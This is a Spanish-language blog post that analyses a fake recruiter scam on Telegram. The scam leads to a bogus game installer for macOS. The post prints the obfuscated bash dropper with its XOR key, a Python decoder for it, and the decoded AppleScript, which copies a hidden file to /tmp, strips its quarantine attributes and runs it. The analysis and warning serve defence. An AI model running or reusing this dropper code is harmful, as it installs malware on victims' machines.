---
layout: post
author: eserror
title: Pescando al Pescador
pubDatetime: 2025-05-03
featured: true
description: Nuevas formas de estafar y comprometer tu sistema siempre habrán, la pregunta es cuál usarán contigo?
tags:
  - crypto
  - scam
---

Hace unos días me encontraba en un grupo de Telegram, y alguien publicó un mensaje que posteriormente tuvo como resultado esta investigación.

Un usuario llamado Austin, publicó un mensaje en el grupo Python Ecuador de Telegram, donde se encontraba buscando un Software Tester para un supuesto videojuego de metaverso.

<img src="/src/assets/images/Pasted image 20250427224337.png">

No suena tan mal la oferta, no? entonces acepté la oferta y después de esto, Austin solicitó información extra para estar seguro de que yo cumplía con los requisitos.

<img src="/src/assets/images/Pasted image 20250428094439.png">

Después de haber terminado este cuestionario, que por cierto tiene preguntas interesantes, las cuales te llevarían a pensar que son preguntas inocente o normales dentro del contexto actual, sin embargo hay otra intención detrás de ellas.

Austin "aprueba" mi perfil, y posteriormente me envía información adicional sobre el proyecto, mientras hace una pausa y guarda silencio, anticipando que yo diría algo respecto al videojuego.

<img src="/src/assets/images/Pasted image 20250428095505.png">

Debo admitir que todo parece 100% real, pues tienen una comunidad en Discord, un Whitepaper donde se encuentra una [sinopsis](https://eternal-decay.gitbook.io/metaworld) sobre el juego, e incluso una colección de [NFTs](https://opensea.io/collection/eternal-decay-metaverse) 😱

Ya que todo luce legítimo, solicito más detalles sobre las tareas a llevar a cabo, y pregunto qué tan cierto es el tema del pago. 💵

<img src="/src/assets/images/Pasted image 20250428114519.png">

Entonces es aquí donde Austin elimina toda duda sobre el pago, al ofrecer un cuota inicial para unirme al chat privado del equipo. Y es aquí también, donde la parte más crítica de la operación de Austin puede fallar o tener éxito.

<img src="/src/assets/images/Pasted image 20250501122700.png">

La información proporcionada por Austin es un poco random y sin ningún orden, algunas imágenes no coinciden y los pasos de instalación tampoco, ya que la aplicación que se muestra durante la instalación, no es la misma que se descarga para su instalación.

Usé el código proporcionado por Austin, el cuál asumí era necesario para acceder al instalador, e inmediatamente se descargó el supuesto instalador del juego.

<img src="/src/assets/images/Pasted image 20250502080418.png">
Lo primero que me pareció extraño de todo el proceso de instalación, e imagino que puede ser obvio que, usualmente ningún juego no te va a pedir que lo instales a través de la consola 😅

<img src="/src/assets/images/Pasted image 20250502081148.png">

El contenido dentro del instalador tiene un peso de menos de 2MB, lo cual podría indicar que el instalador descarga algún tipo de archivo adicional. El archivo `EternalDecay.PEr` llama la atención más que el resto, así que ejecutamos el comando file, para saber qué tipo de archivo es.

```sh
➜  file EternalDecay.PEr
EternalDecay.PEr: Bourne-Again shell script text executable, ASCII text, with very long lines (388)
```

Y desde este momento el juego deja de parecer juego, ya que este script en bash se va a ejecutar una vez intentes instalar el juego. Saber qué acciones realiza este script es vital, ya que podemos saber qué es lo que el atacante intenta hacer.

```bash
#!/bin/bash

if false; then
    HprWMr=350
    UYMZPuPu() {
        local var=286
        return 0
    }
    NrGpUl=692
fi

dPwVdu() { echo "$1" | base64 --decode; }

zZvOBNrD='GU'
# zUMalMuWLb
nyoUPXSF='CVVzEJvdn'
# wzRhWOxZLP
sBPrdnVP='BHndz+Fr1ODIKnkkLVp/V7HR/K9Irox8ZerRXCg2T1el7CVDSK9MUGXGCWA01vsvEb3x80i'
# bKdnoCEDxJ
soHcuyzH='vTFBlxnk0MJ5PH7'
# reypFOgvXm
tVTWqYNR='HRzac8v/gk0epIRC'
# GwCojJQnEe
coLxXhyB='h2T3+x0cyvSL8ADMwukWysNkMvEb393+QXDFDRxmhQrDZDLxG9/YcEwwxQ0fpZYMlaHnN9rUWH6EdBDMkCRSCEDvsvEb3x8/yDYRhNQkUYhJ5DLxG98fPgFxAQKbpYRISy13OlrWnzBL/4JMUCSUQoNk8fsdHNpzy/+C'
# bmCcvVUWCm
rMTBWoNj='TR4v0YhJ5DLxG98fNIr0xQZepJRMg2Tx+x0c2nSL9wFMle'
# frZcxvoXVB
TavHyPAi='CSQkz5NbEb3dd/y/ECjJUllI6I4fG1HRWct'
# WtRjtYhJCi
kUUBaElK='IgwBwKbuRqISeQy8RvfHzSK9MUGXqRRiEnkMvEZHN3/yvQQwlhmk8yPIPp7HRzadIgwAUZfo'
# SPFTUFbzjZ
hfYbWtuB='JRC1ai58RvfHzSK9MUGXqRRiEnkMvEb3x80i/ERzFhgUYLCYfb13t7K9gB0xQZepFGISeQy8RvfHzSL8QGCnqSUTIDvsvEb3x80ivTFBl+hlQyJ5PV13R/d8IwwzgZepFGISOH2ddvfyv4Bvk4GXqRRiEjvcHEZG9z+AX2HzR8glELVqLL7HRwfNIB2xQ0frhNCgO+y8RvfHzSK9MUGXGaTQwsh9XvS1J80ivTFApu5UohI73BzkV8fNIr0AkKYYFGMgno39dra2LOL9RDMXqSEQodkMXBHWdt+SDEBwphnVchDZDBxGRvc/gF9h80fIJRC1aiy8dFfHLXEds4GXqRRiEsn8Dpb39z+CDQPAlu4U0hLIPaxG90bsk'
# nJVuqmNboE
RGEyTVVi='wwB8zVOVJCiGDwNQee'
# LWsZeeVsYi
uZhMUPmd='y7SD/0UGXqRRgtWh5zEa3ts+C7QGzR+t0YMI+nL10EEaMEvxAoFfpYRCSeQwcRre2z4LacbMm6FaiEnkMvEZHN3/yvQQwpu4VY5PJPb2Gt7K/or0EMyQJFIJFeD'
# aoAMLvoUzh
GUtUgBuF='2O5vBXLSK8sUCWGSVjwJl9jXfVJ80ivTFDRxmhQrDZDLxG98fNIr0xQKfuhGC1a5wO9rSnz4'
kcqPodZo='WtwKMWGSESEnm9Xvf3xvwQH'
AzSkDUFk='TGhl6i'
# GKXHHiYYiI
SUTRTpBB='UYLPIfa6WtrcNIvyAUzV'
# aVvDiNoPkD
OegHesMx='OBGClaIy+lra2/4LdQEM3+SSQwjtufEb3x80i/EBgp6khELCrrnxG98fNIgwAo1aL9GISeQy8RvfHzSL8AFGXGeTjIzqd/EZHNx+AX+BDR6kUgxV5DLxEV8dtIg1EIyCoJNMieTwe'
# ewKfcWHVsv
etflAoZZ='8fd2/SL6seGX6WVgsik8Tpa1p80QHTGhl6mUYiDZPU6XsEK8E/wxQKVOlYCjeT2tdFfyvBP6MEAWGSVj0jl5zsbVJ80ivTFApu5UohLIPV6H1SfNIr0xQ0cZoUKw2Qy8RvfHzSK9MUCn7oRgtWucDva0p8+FrcCjFhkhEhJ5uY1HRvK/gB0wcJQJFIISeIy+50a23/L8QYGX6KVwsJ4cvvHmR8/y/EBzN8llYLIpPE6WtaUNIr0xQZfoZUMieTnO5CVlDSK9MUGXGCWA01vsvEb3x80ivTFBl+glchLJ/D13tFaNIg3BkzVLxWDCeQxdQeVW/5WsMUGwq3RiENkMHE'
OWsckYok='ZHsq+VvA'
tmFWUIEl='Hwp6kkwKV5vYxGsEdtIgwB8yYZJjCyyT/dR0b3TYAdMU'
hmgJDZBY='GXqSTQoJgMvpZHcu2AHTFBl6khELCrrnxG98fNIr0xQZepJKCh2T1uxra2j5K9AJCQqaUQssgMvudGtt/y/EGBl+ilcLCeHL7x5kfP8vxAczfJZWCyKTxOlrWlDSK9MUGX6GVDInk5zuQlZQwT+nGBlxmhAKDbKR'

CsWOoh="${zZvOBNrD}${nyoUPXSF}${sBPrdnVP}${soHcuyzH}${tVTWqYNR}${coLxXhyB}${rMTBWoNj}${TavHyPAi}${kUUBaElK}${hfYbWtuB}${RGEyTVVi}${uZhMUPmd}${GUtUgBuF}${kcqPodZo}${AzSkDUFk}${SUTRTpBB}${OegHesMx}${etflAoZZ}${OWsckYok}${tmFWUIEl}${hmgJDZBY}"

LxKbud=$(echo "$CsWOoh" | base64 --decode | perl -e 'my $key = pack("H*", "5039d0216864d1ac8d2c3d1b9b689273"); my $data = do { local $/; <STDIN> }; my $k = length($key); for(my $i=0; $i < length($data); $i++){ print chr( ord(substr($data, $i, 1)) ^ ord(substr($key, $i % $k, 1)) ); }')
GYLkGA=$(dPwVdu "$LxKbud")
eval "$GYLkGA"

```

Cuando vi este script por primera vez, al llegar a la última línea de código pensé, si hay un `eval` algo interesante puede pasar. Ahora es necesario desofuscar el código para entender con más detalle qué es lo que hace, aunque quizás ya pueden imaginar qué hace.

```python
import base64

parts = [
    'GU', 'CVVzEJvdn', 'BHndz+Fr1ODIKnkkLVp/V7HR/K9Irox8ZerRXCg2T1el7CVDSK9MUGXGCWA01vsvEb3x80i',
    'vTFBlxnk0MJ5PH7', 'HRzac8v/gk0epIRC',
    'h2T3+x0cyvSL8ADMwukWysNkMvEb393+QXDFDRxmhQrDZDLxG9/YcEwwxQ0fpZYMlaHnN9rUWH6EdBDMkCRSCEDvsvEb3x8/yDYRhNQkUYhJ5DLxG98fPgFxAQKbpYRISy13OlrWnzBL/4JMUCSUQoNk8fsdHNpzy/+C',
    'TR4v0YhJ5DLxG98fNIr0xQZepJRMg2Tx+x0c2nSL9wFMle',
    'CSQkz5NbEb3dd/y/ECjJUllI6I4fG1HRWct',
    'IgwBwKbuRqISeQy8RvfHzSK9MUGXqRRiEnkMvEZHN3/yvQQwlhmk8yPIPp7HRzadIgwAUZfo',
    'JRC1ai58RvfHzSK9MUGXqRRiEnkMvEb3x80i/ERzFhgUYLCYfb13t7K9gB0xQZepFGISeQy8RvfHzSL8QGCnqSUTIDvsvEb3x80ivTFBl+hlQyJ5PV13R/d8IwwzgZepFGISOH2ddvfyv4Bvk4GXqRRiEjvcHEZG9z+AX2HzR8glELVqLL7HRwfNIB2xQ0frhNCgO+y8RvfHzSK9MUGXGaTQwsh9XvS1J80ivTFApu5UohI73BzkV8fNIr0AkKYYFGMgno39dra2LOL9RDMXqSEQodkMXBHWdt+SDEBwphnVchDZDBxGRvc/gF9h80fIJRC1aiy8dFfHLXEds4GXqRRiEsn8Dpb39z+CDQPAlu4U0hLIPaxG90bsk',
    'wwB8zVOVJCiGDwNQee',
    'y7SD/0UGXqRRgtWh5zEa3ts+C7QGzR+t0YMI+nL10EEaMEvxAoFfpYRCSeQwcRre2z4LacbMm6FaiEnkMvEZHN3/yvQQwpu4VY5PJPb2Gt7K/or0EMyQJFIJFeD',
    '2O5vBXLSK8sUCWGSVjwJl9jXfVJ80ivTFDRxmhQrDZDLxG98fNIr0xQKfuhGC1a5wO9rSnz4',
    'WtwKMWGSESEnm9Xvf3xvwQH',
    'TGhl6i',
    'UYLPIfa6WtrcNIvyAUzV',
    'OBGClaIy+lra2/4LdQEM3+SSQwjtufEb3x80i/EBgp6khELCrrnxG98fNIgwAo1aL9GISeQy8RvfHzSL8AFGXGeTjIzqd/EZHNx+AX+BDR6kUgxV5DLxEV8dtIg1EIyCoJNMieTwe',
    '8fd2/SL6seGX6WVgsik8Tpa1p80QHTGhl6mUYiDZPU6XsEK8E/wxQKVOlYCjeT2tdFfyvBP6MEAWGSVj0jl5zsbVJ80ivTFApu5UohLIPV6H1SfNIr0xQ0cZoUKw2Qy8RvfHzSK9MUCn7oRgtWucDva0p8+FrcCjFhkhEhJ5uY1HRvK/gB0wcJQJFIISeIy+50a23/L8QYGX6KVwsJ4cvvHmR8/y/EBzN8llYLIpPE6WtaUNIr0xQZfoZUMieTnO5CVlDSK9MUGXGCWA01vsvEb3x80ivTFBl+glchLJ/D13tFaNIg3BkzVLxWDCeQxdQeVW/5WsMUGwq3RiENkMHE',
    'ZHsq+VvA',
    'Hwp6kkwKV5vYxGsEdtIgwB8yYZJjCyyT/dR0b3TYAdMU',
    'GXqSTQoJgMvpZHcu2AHTFBl6khELCrrnxG98fNIr0xQZepJKCh2T1uxra2j5K9AJCQqaUQssgMvudGtt/y/EGBl+ilcLCeHL7x5kfP8vxAczfJZWCyKTxOlrWlDSK9MUGX6GVDInk5zuQlZQwT+nGBlxmhAKDbKR'
]

combined_base64 = ''.join(parts)
decoded_bytes = base64.b64decode(combined_base64)

key_hex = "5039d0216864d1ac8d2c3d1b9b689273"
key = bytes.fromhex(key_hex)
key_len = len(key)

decrypted_bytes = bytes([b ^ key[i % key_len] for i, b in enumerate(decoded_bytes)])

final_payload = base64.b64decode(decrypted_bytes)

print(final_payload.decode(errors="replace"))

```

Después de observar el resultado, se puede llegar a la siguiente conclusión sobre qué acciones realiza el script:

- Busca si hay un volumen montado conteniendo el nombre `"EternalDecay".
- Si lo encuentra, crea una ruta oculta llamada `.EternalDecay` en ese volumen.
- Copia un archivo en /tmp/, elimina los metadatos, cambia permisos y lo ejecuta.

```shell
#!/bin/bash

osascript -e 'on run

try
set diskList to list disks
end try

set targetDisk to ""

try
repeat with disk in diskList

if disk contains "EternalDecay" then

set targetDisk to disk
exit repeat

end if

end repeat

end try

if targetDisk is "" then

return

end if

set folderPath to "/Volumes/" & targetDisk & "/"
set appName to ".EternalDecay"
set appPath to folderPath & appName
set tempAppPath to "/tmp/" & appName

try
do shell script "rm -f " & quoted form of tempAppPath
end try

try
do shell script "cp " & quoted form of appPath & " " & quoted form of tempAppPath
end try

try
do shell script "xattr -c " & quoted form of tempAppPath
end try

try
do shell script "chmod +x " & quoted form of tempAppPath
end try

try
do shell script quoted form of tempAppPath
end try

end run'
```

Este script no hace mucho más que preparar el escenario para una descarga y posterior ejecución probablemente de algún tipo de malware. Así que sin sospechar más, habría ejecutado un archivo que probablemente infectaría mi computadora, dándole acceso así a un atacante con unos patrones muy similares a los usados por el régimen de [Corea del Norte](https://rekt.news/the-impersonator)

Así que si eres un desarrollador, un usuario del entorno web3, o investigador de seguridad, no olvides que los ataques de ingeniería social en el mundo crypto abundan y que en el momento menos esperado, tu sistema puede ser comprometido.

Estar seguro con quién colaboras y qué archivos ejecutas, en algunos casos puede ser la diferencia entre una gran perdida o solo una historia que a otros les sucede.
